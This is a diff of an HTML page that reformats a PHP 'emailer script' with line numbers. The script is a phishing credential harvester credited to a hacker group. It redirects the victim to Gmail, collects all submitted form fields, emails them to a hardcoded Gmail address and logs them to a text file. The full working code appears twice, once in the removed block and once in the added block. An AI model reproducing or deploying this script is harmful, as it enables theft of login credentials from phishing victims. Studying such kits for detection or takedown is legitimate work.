@@ -37,36 +37,36 @@
 
 <h3>Emailer Script Source Code</h3>
 
-<div class="highlight"><pre><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
-
-<span class="cm">/* </span>
-<span class="cm">H4KurD-TeaM</span>
-<span class="cm">www.h4kurd.com</span>
-<span class="cm">Coded By : Hangaw_HawlerY</span>
-<span class="cm">Email: Hangaw_HawlerY@Yahoo.com , Hangaw_HawlerY@Hotmail.com </span>
-<span class="cm">All Right Reserved</span>
-<span class="cm">*/</span>
-
-<span class="nb">header</span> <span class="p">(</span><span class="s1">&#39;Location: https://www.gmail.com&#39;</span><span class="p">);</span>
-
-<span class="nv">$posts</span>        <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
-<span class="k">foreach</span><span class="p">(</span><span class="nv">$_POST</span> <span class="k">as</span> <span class="nv">$k</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="nv">$v</span><span class="p">){</span>
-    <span class="nv">$posts</span> <span class="o">.=</span> <span class="s1">&#39;$_POST[&#39;</span><span class="o">.</span><span class="nv">$k</span><span class="o">.</span><span class="s1">&#39;] = &#39;</span><span class="o">.</span><span class="nv">$v</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
-<span class="p">}</span>
-
-<span class="nv">$posts</span>       <span class="o">.=</span> <span class="s2">&quot;---------------------------------------------------</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
-<span class="nv">$emailto</span>    <span class="o">=</span> <span class="s1">&#39;pramod.sin321@gmail.com&#39;</span><span class="p">;</span>
-<span class="nv">$subject</span>    <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_HOST&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;-&quot;</span><span class="o">.</span><span class="nv">$_SEREVER</span><span class="p">[</span><span class="s1">&#39;SERVER_NAME&#39;</span><span class="p">];</span>
-<span class="nv">$from</span>        <span class="o">=</span> <span class="s2">&quot;From: Password &amp;lt;h4kurd.team@gmail.com&amp;gt;&quot;</span><span class="p">;</span>
-<span class="nv">$body</span>        <span class="o">=</span> <span class="s1">&#39;</span>
-<span class="s1">&#39;</span><span class="o">.</span><span class="nv">$posts</span><span class="o">.</span><span class="s1">&#39;</span>
-<span class="s1">&#39;</span><span class="p">;</span>
-
-<span class="o">@</span><span class="nb">mail</span><span class="p">(</span><span class="nv">$emailto</span><span class="p">,</span> <span class="nv">$subject</span><span class="p">,</span> <span class="nv">$body</span><span class="p">,</span> <span class="nv">$from</span><span class="p">);</span>
-<span class="nv">$handle</span> <span class="o">=</span> <span class="o">@</span><span class="nb">fopen</span><span class="p">(</span><span class="s2">&quot;h4kurd.txt&quot;</span><span class="p">,</span> <span class="s2">&quot;a+&quot;</span><span class="p">);</span>
-<span class="o">@</span><span class="nb">fwrite</span><span class="p">(</span><span class="nv">$handle</span><span class="p">,</span> <span class="nv">$posts</span><span class="p">);</span>
-<span class="nb">fclose</span><span class="p">(</span><span class="nv">$handle</span><span class="p">);</span>
-<span class="cp">?&gt;</span><span class="x"></span></code></pre></div>
+<div class="highlight"><pre><code class="language-php" data-lang="php"><span class="lineno"> 1</span> <span class="cp">&lt;?php</span>
+<span class="lineno"> 2</span> 
+<span class="lineno"> 3</span> <span class="cm">/* </span>
+<span class="lineno"> 4</span> <span class="cm">H4KurD-TeaM</span>
+<span class="lineno"> 5</span> <span class="cm">www.h4kurd.com</span>
+<span class="lineno"> 6</span> <span class="cm">Coded By : Hangaw_HawlerY</span>
+<span class="lineno"> 7</span> <span class="cm">Email: Hangaw_HawlerY@Yahoo.com , Hangaw_HawlerY@Hotmail.com </span>
+<span class="lineno"> 8</span> <span class="cm">All Right Reserved</span>
+<span class="lineno"> 9</span> <span class="cm">*/</span>
+<span class="lineno">10</span> 
+<span class="lineno">11</span> <span class="nb">header</span> <span class="p">(</span><span class="s1">&#39;Location: https://www.gmail.com&#39;</span><span class="p">);</span>
+<span class="lineno">12</span> 
+<span class="lineno">13</span> <span class="nv">$posts</span>        <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+<span class="lineno">14</span> <span class="k">foreach</span><span class="p">(</span><span class="nv">$_POST</span> <span class="k">as</span> <span class="nv">$k</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="nv">$v</span><span class="p">){</span>
+<span class="lineno">15</span>     <span class="nv">$posts</span> <span class="o">.=</span> <span class="s1">&#39;$_POST[&#39;</span><span class="o">.</span><span class="nv">$k</span><span class="o">.</span><span class="s1">&#39;] = &#39;</span><span class="o">.</span><span class="nv">$v</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
+<span class="lineno">16</span> <span class="p">}</span>
+<span class="lineno">17</span> 
+<span class="lineno">18</span> <span class="nv">$posts</span>       <span class="o">.=</span> <span class="s2">&quot;---------------------------------------------------</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
+<span class="lineno">19</span> <span class="nv">$emailto</span>    <span class="o">=</span> <span class="s1">&#39;pramod.sin321@gmail.com&#39;</span><span class="p">;</span>
+<span class="lineno">20</span> <span class="nv">$subject</span>    <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_HOST&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;-&quot;</span><span class="o">.</span><span class="nv">$_SEREVER</span><span class="p">[</span><span class="s1">&#39;SERVER_NAME&#39;</span><span class="p">];</span>
+<span class="lineno">21</span> <span class="nv">$from</span>        <span class="o">=</span> <span class="s2">&quot;From: Password &amp;lt;h4kurd.team@gmail.com&amp;gt;&quot;</span><span class="p">;</span>
+<span class="lineno">22</span> <span class="nv">$body</span>        <span class="o">=</span> <span class="s1">&#39;</span>
+<span class="lineno">23</span> <span class="s1">&#39;</span><span class="o">.</span><span class="nv">$posts</span><span class="o">.</span><span class="s1">&#39;</span>
+<span class="lineno">24</span> <span class="s1">&#39;</span><span class="p">;</span>
+<span class="lineno">25</span> 
+<span class="lineno">26</span> <span class="o">@</span><span class="nb">mail</span><span class="p">(</span><span class="nv">$emailto</span><span class="p">,</span> <span class="nv">$subject</span><span class="p">,</span> <span class="nv">$body</span><span class="p">,</span> <span class="nv">$from</span><span class="p">);</span>
+<span class="lineno">27</span> <span class="nv">$handle</span> <span class="o">=</span> <span class="o">@</span><span class="nb">fopen</span><span class="p">(</span><span class="s2">&quot;h4kurd.txt&quot;</span><span class="p">,</span> <span class="s2">&quot;a+&quot;</span><span class="p">);</span>
+<span class="lineno">28</span> <span class="o">@</span><span class="nb">fwrite</span><span class="p">(</span><span class="nv">$handle</span><span class="p">,</span> <span class="nv">$posts</span><span class="p">);</span>
+<span class="lineno">29</span> <span class="nb">fclose</span><span class="p">(</span><span class="nv">$handle</span><span class="p">);</span>
+<span class="lineno">30</span> <span class="cp">?&gt;</span><span class="x"></span></code></pre></div>
 
 
 
